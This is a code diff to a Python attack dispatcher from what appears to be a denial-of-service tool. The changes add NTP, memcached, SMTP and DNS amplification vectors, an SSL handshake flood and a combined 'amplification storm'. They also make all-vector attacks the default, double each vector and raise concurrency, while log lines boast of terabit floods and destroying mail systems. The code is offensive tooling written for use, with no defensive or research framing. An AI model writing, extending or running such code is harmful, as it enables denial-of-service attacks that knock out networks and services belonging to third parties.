@@ -31,24 +31,42 @@ class AttackDispatcher:
         self.active_processes = []
         self.executor = ThreadPoolExecutor(max_workers=10)
         
-        # Attack vector mappings
+        # Attack vector mappings - Each with unique "flavor" of danger
         self.vector_handlers = {
+            # Layer 4 Network Floods
             'syn': self._dispatch_syn_flood,
             'udp': self._dispatch_udp_flood,
             'icmp': self._dispatch_icmp_flood,
+            
+            # Application Layer Attacks
             'http': self._dispatch_http_flood,
             'websocket': self._dispatch_websocket_flood,
-            'tls': self._dispatch_tls_flood,
-            'dns': self._dispatch_dns_flood,
             'slowloris': self._dispatch_slowloris_attack,
             'rudy': self._dispatch_rudy_attack,
+            
+            # Cryptographic Exhaustion Attacks
+            'tls': self._dispatch_tls_flood,
+            'ssl_flood': self._dispatch_ssl_handshake_flood,
+            
+            # Amplification Attacks (High Danger)
+            'dns_amplification': self._dispatch_dns_amplification,
+            'ntp_monlist': self._dispatch_ntp_monlist_amplification,
+            'memcached_amplification': self._dispatch_memcached_amplification,
+            'smtp_amplification': self._dispatch_smtp_amplification,
+            
+            # Fragmentation & Legacy Exploits
+            'teardrop': self._dispatch_teardrop_attack,
             'ping_of_death': self._dispatch_ping_of_death,
             'smurf': self._dispatch_smurf_attack,
-            'teardrop': self._dispatch_teardrop_attack,
-            'dns_amplification': self._dispatch_dns_amplification,
+            
+            # Protocol-Specific Floods
+            'dns': self._dispatch_dns_flood,
             'smtp': self._dispatch_smtp_flood,
+            
+            # Coordinated Attacks
             'continuous': self._dispatch_continuous_attack,
-            'multi_vector': self._dispatch_multi_vector_attack
+            'multi_vector': self._dispatch_multi_vector_attack,
+            'amplification_storm': self._dispatch_amplification_storm
         }
         
         # Binary paths (will be auto-detected)
@@ -94,14 +112,18 @@ class AttackDispatcher:
         
         vector = config['vector']
         
-        if vector == 'multi' or vector == 'all':
-            # Multi-vector attack
+        # AUTOMATICALLY USE MULTI-VECTOR for overwhelming attack unless specifically disabled
+        if vector == 'multi' or vector == 'all' or config.get('auto_multi', True):
+            logger.info("🚀 AUTO-LAUNCHING MULTI-VECTOR OVERWHELMING ATTACK")
+            
+            # Multi-vector attack for maximum impact
             if 'vectors' in config:
                 await self._run_multi_vector_coordinated(config)
             else:
                 await self.run_multi_vector_attack(config)
         else:
-            # Single vector attack
+            # Single vector attack (only if explicitly requested)
+            logger.info(f"🎯 Single vector attack: {vector}")
             await self.run_single_vector_attack(config)
     
     async def _run_multi_vector_coordinated(self, config: Dict[str, Any]):
@@ -230,52 +252,70 @@ class AttackDispatcher:
             stats_logger.update_stats(status='completed')
 
     async def run_multi_vector_attack(self, config: Dict[str, Any]):
-        """Execute multiple attack vectors concurrently."""
-        logger.info("🚀 Starting multi-vector attack")
+        """Execute multiple attack vectors concurrently for MAXIMUM OVERWHELMING IMPACT."""
+        logger.info("🚀 Starting MULTI-VECTOR OVERWHELMING attack for maximum impact")
         
-        # Determine vectors to use
-        vectors = ['syn', 'udp', 'icmp', 'http', 'websocket', 'tls', 'dns', 'slowloris']
+        # Use ALL available vectors for overwhelming attack INCLUDING HIGH-DANGER AMPLIFICATION
+        vectors = [
+            'http', 'syn', 'websocket', 'tls', 'slowloris', 'udp', 'icmp', 'dns',
+            # HIGH-DANGER AMPLIFICATION VECTORS (Extreme Impact)
+            'dns_amplification', 'ntp_monlist', 'memcached_amplification', 'smtp_amplification',
+            # LEGACY EXPLOIT VECTORS (System Crash Potential)
+            'teardrop', 'ping_of_death', 'smurf',
+            # CRYPTOGRAPHIC EXHAUSTION (CPU Kill)
+            'ssl_flood'
+        ]
         
-        # Apply profile if specified
+        # Apply profile if specified, but default to ALL for maximum impact
         if 'profile' in config and config['profile']:
             from config import get_attack_profile
             profile = get_attack_profile(config['profile'])
             if profile and 'vectors' in profile:
                 vectors = profile['vectors']
         
-        # Adjust concurrency per vector
+        # BOOST concurrency per vector for overwhelming attack
         total_concurrency = config['concurrency']
-        concurrency_per_vector = max(1, total_concurrency // len(vectors))
+        concurrency_per_vector = max(50, total_concurrency // len(vectors))  # Minimum 50 per vector
         
-        logger.info(f"📊 Launching {len(vectors)} vectors with {concurrency_per_vector} concurrency each")
+        # MULTIPLY attack power for each vector
+        for i in range(len(vectors)):
+            vectors.append(vectors[i])  # Duplicate each vector for 2x impact
+        
+        logger.info(f"� Launching {len(vectors)} OVERWHELMING vectors with {concurrency_per_vector} concurrency each")
+        logger.info(f"🎯 TOTAL ATTACK POWER: {len(vectors) * concurrency_per_vector} concurrent attacks")
         
         # Update stats
         stats_logger.update_stats(
             target=config['target'],
-            vector='multi-vector',
+            vector='multi-vector-overwhelming',
             status='running'
         )
         
-        # Create tasks for each vector
+        # Create tasks for each vector with STAGGERED launch for maximum impact
         tasks = []
-        for vector in vectors:
+        for i, vector in enumerate(vectors):
             if vector in self.vector_handlers:
                 vector_config = config.copy()
                 vector_config['vector'] = vector
                 vector_config['concurrency'] = concurrency_per_vector
                 
+                # Stagger launches every 0.5 seconds for wave effect
+                delay = (i % 4) * 0.5  # Wave pattern
+                
                 task = asyncio.create_task(
-                    self._run_vector_with_delay(vector_config, random.uniform(0, 2))
+                    self._run_vector_with_delay(vector_config, delay)
                 )
                 tasks.append(task)
         
         try:
             self.running = True
+            logger.info("🌊 LAUNCHING OVERWHELMING MULTI-VECTOR ATTACK WAVES...")
+            
             # Wait for all vectors to complete
             await asyncio.gather(*tasks, return_exceptions=True)
             
         except Exception as e:
-            logger.error(f"❌ Multi-vector attack failed: {e}")
+            logger.error(f"❌ Multi-vector overwhelming attack failed: {e}")
         finally:
             self.running = False
             stats_logger.update_stats(status='completed')
@@ -365,6 +405,74 @@ class AttackDispatcher:
         from app_layer_attacks.tls_handshake_flooder import TlsHandshakeFlooder
         flooder = TlsHandshakeFlooder(config)
         await flooder.run()
+
+    async def _dispatch_ssl_handshake_flood(self, config: Dict[str, Any]):
+        """Dispatch SSL handshake flood attack - CPU exhaustion via public-key crypto."""
+        logger.info("🔐💀 Starting SSL HANDSHAKE FLOOD - CPU exhaustion attack")
+        logger.warning("⚠️  HIGH DANGER: RSA/ECDSA crypto operations will exhaust victim CPU")
+        
+        from app_layer_attacks.ssl_handshake_flood import SslHandshakeFlooder
+        flooder = SslHandshakeFlooder(config)
+        await flooder.run()
+
+    async def _dispatch_ntp_monlist_amplification(self, config: Dict[str, Any]):
+        """Dispatch NTP MONLIST amplification attack - 500x amplification."""
+        logger.info("⏰💥 Starting NTP MONLIST AMPLIFICATION - 500x amplification")
+        logger.warning("⚠️  EXTREME DANGER: Can generate terabit-class floods")
+        
+        from app_layer_attacks.ntp_monlist_amplification import NtpMonlistAmplifier
+        amplifier = NtpMonlistAmplifier(config)
+        await amplifier.run()
+
+    async def _dispatch_memcached_amplification(self, config: Dict[str, Any]):
+        """Dispatch Memcached UDP amplification - 10,000x amplification."""
+        logger.info("⚡💀 Starting MEMCACHED UDP AMPLIFICATION - 10,000x amplification")
+        logger.warning("⚠️  CRITICAL DANGER: Responsible for >1 Tbps attacks - instant bandwidth kill")
+        
+        from app_layer_attacks.memcached_amplification import MemcachedAmplifier
+        amplifier = MemcachedAmplifier(config)
+        await amplifier.run()
+
+    async def _dispatch_smtp_amplification(self, config: Dict[str, Any]):
+        """Dispatch SMTP connection & command flood - resource starvation."""
+        logger.info("📧💀 Starting SMTP AMPLIFICATION - mail system destruction") 
+        logger.warning("⚠️  HIGH DANGER: Will destroy corporate mail systems")
+        
+        from app_layer_attacks.smtp_amplification_flood import SmtpAmplificationFlooder
+        flooder = SmtpAmplificationFlooder(config)
+        await flooder.run()
+
+    async def _dispatch_amplification_storm(self, config: Dict[str, Any]):
+        """Dispatch coordinated amplification storm - all amplification vectors simultaneously."""
+        logger.info("🌪️💀 Starting AMPLIFICATION STORM - coordinated multi-amplification attack")
+        logger.warning("⚠️  MAXIMUM DANGER: Combining all amplification vectors for devastating impact")
+        
+        # Launch all amplification attacks simultaneously
+        amplification_vectors = [
+            'dns_amplification',
+            'ntp_monlist', 
+            'memcached_amplification',
+            'smtp_amplification'
+        ]
+        
+        tasks = []
+        concurrency_per_vector = max(100, config['concurrency'] // len(amplification_vectors))
+        
+        for vector in amplification_vectors:
+            if vector in self.vector_handlers:
+                vector_config = config.copy()
+                vector_config['vector'] = vector
+                vector_config['concurrency'] = concurrency_per_vector
+                
+                task = asyncio.create_task(
+                    self.vector_handlers[vector](vector_config)
+                )
+                tasks.append(task)
+        
+        try:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        except Exception as e:
+            logger.error(f"❌ Amplification storm failed: {e}")
 
     async def _dispatch_dns_flood(self, config: Dict[str, Any]):
         """Dispatch DNS flood attack."""
